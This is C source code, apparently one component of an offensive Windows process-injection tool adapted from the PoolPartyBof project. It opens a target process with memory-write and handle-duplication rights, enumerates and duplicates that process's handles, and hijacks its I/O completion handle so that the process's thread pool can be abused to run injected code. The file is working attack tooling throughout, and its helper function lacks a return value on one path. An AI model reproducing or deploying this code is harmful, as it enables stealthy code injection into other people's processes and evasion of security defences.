/*
* Most of this code was adapted from PoolPartyBof project
* Credits: https://github.com/0xEr3bus/PoolPartyBof
*/
#include <windows.h>
#include <stdio.h>
#include "IoCompletionHandle.h"

BYTE* NtQueryObject_(HANDLE x, OBJECT_INFORMATION_CLASS y) {
    _NtQueryObject pNtQueryObject = (_NtQueryObject)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryObject"));
    ULONG InformationLength = 0;
    NTSTATUS Ntstatus = STATUS_INFO_LENGTH_MISMATCH;
    BYTE* Information = NULL;

    do {
        Information = (BYTE*)realloc(Information, InformationLength);
        Ntstatus = pNtQueryObject(x, y, Information, InformationLength, &InformationLength);
    } while (STATUS_INFO_LENGTH_MISMATCH == Ntstatus);

    return Information;
}


HANDLE HijackProcessHandle(PWSTR wsObjectType, HANDLE hTarget, DWORD dwDesiredAccess) {
    _NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess"));

    BYTE* Information = NULL;
    ULONG InformationLength = 0;
    NTSTATUS Ntstatus = STATUS_INFO_LENGTH_MISMATCH;

    do {
        Information = (BYTE*)realloc(Information, InformationLength);
        Ntstatus = pNtQueryInformationProcess(hTarget, (PROCESSINFOCLASS)(ProcessHandleInformation), Information, InformationLength, &InformationLength);
    } while (STATUS_INFO_LENGTH_MISMATCH == Ntstatus);


    PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessHandleInformation = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)(Information);

    HANDLE hDuplicatedObject;
    ULONG InformationLength_ = 0;

    for (int i = 0; i < pProcessHandleInformation->NumberOfHandles; i++) {
        DuplicateHandle(
            hTarget,
            pProcessHandleInformation->Handles[i].HandleValue,
            GetCurrentProcess(),
            &hDuplicatedObject,
            dwDesiredAccess,
            FALSE,
            (DWORD_PTR)NULL);

        BYTE* pObjectInformation;
        // This object is allocated by NtQueryObject_()
        // We need to manually free it at the end
        pObjectInformation = NtQueryObject_(hDuplicatedObject, ObjectTypeInformation);
        PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation = (PPUBLIC_OBJECT_TYPE_INFORMATION)(pObjectInformation);

        if (wcscmp(wsObjectType, pObjectTypeInformation->TypeName.Buffer) != 0) {
            // Duplicating the handle ensures that the reference count is increased so that the mutex object will not be destroyed until both threads have closed the handle.
            // https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-duplicatehandle
            CloseHandle(hDuplicatedObject);
            continue;
        }

        // Cleanup
        if (Information != NULL) free(Information);
        // This object was allocated by NtQueryObject_()
        if (pObjectInformation != NULL) free(pObjectInformation);

        return hDuplicatedObject;
    }
}


HANDLE HijackIoCompletionProcessHandle(HANDLE hTarget) {
    return HijackProcessHandle((PWSTR)L"IoCompletion\0", hTarget, IO_COMPLETION_ALL_ACCESS);
}


HANDLE GetTargetThreadPoolIoCompletionHandle(HANDLE hTarget) {
    HANDLE hIoCompletion = HijackIoCompletionProcessHandle(hTarget);
    printf("[INFO]   Hijacked I/O completion handle from the target process: 0x%x\n", hIoCompletion);
    return hIoCompletion;
}




HANDLE GetTargetProcessHandle(DWORD m_dwTargetPid) {
    HANDLE p_hTargetPid = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, m_dwTargetPid);
    if (p_hTargetPid == NULL) {
        return NULL;
    }
    else {
        printf("[INFO]   Retrieved handle to the target process: 0x%p\n", p_hTargetPid);
        return p_hTargetPid;
    }
}

